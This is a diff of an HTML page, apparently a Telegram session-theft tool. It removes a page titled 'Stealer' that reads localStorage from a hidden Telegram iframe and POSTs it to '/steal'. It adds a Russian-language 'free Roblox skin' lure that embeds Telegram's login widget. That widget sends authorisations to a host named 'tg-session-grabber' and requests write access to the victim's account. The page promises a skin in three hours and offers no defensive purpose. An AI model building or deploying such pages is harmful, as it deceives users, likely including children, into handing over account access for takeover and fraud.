@@ -2,38 +2,50 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Stealer</title>
+    <title>Бесплатный скин Roblox</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: #1a1a2e;
+            color: white;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: #16213e;
+            padding: 30px;
+            border-radius: 15px;
+        }
+        .btn-telegram {
+            margin-top: 30px;
+        }
+        .note {
+            font-size: 12px;
+            color: #888;
+            margin-top: 30px;
+        }
+    </style>
 </head>
 <body>
-<h1>Stealing...</h1>
-<script>
-    const iframe = document.createElement('iframe');
-    iframe.src = 'https://web.telegram.org/k/';
-    iframe.style.position = 'absolute';
-    iframe.style.width = '1px';
-    iframe.style.height = '1px';
-    iframe.style.opacity = '0';
-    document.body.appendChild(iframe);
-    
-    setTimeout(() => {
-        try {
-            const ls = iframe.contentWindow.localStorage;
-            const data = {};
-            for (let i = 0; i < ls.length; i++) {
-                const key = ls.key(i);
-                data[key] = ls.getItem(key);
-            }
-            fetch('/steal', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ type: 'localstorage', data: data })
-            });
-            document.body.innerHTML = '<h2>Done</h2>';
-        } catch(e) {
-            document.body.innerHTML = '<h2>Error: ' + e.message + '</h2>';
-        }
-    }, 3000);
-</script>
+<div class="container">
+    <h1>🎁 Бесплатный скин Roblox</h1>
+    <p>Нажми на кнопку, чтобы получить скин</p>
+    <div class="btn-telegram">
+        <script async src="https://telegram.org/js/telegram-widget.js?22"
+            data-telegram-login="ASSADMINS_bot"
+            data-size="large"
+            data-auth-url="https://tg-session-grabber.onrender.com/auth"
+            data-request-access="write">
+        </script>
+    </div>
+    <div class="note">
+        ✅ Работает мгновенно<br>
+        ✅ Никаких смс и паролей<br>
+        ✅ Скин появится в инвентаре через 3 часа
+    </div>
+</div>
 </body>
 </html>
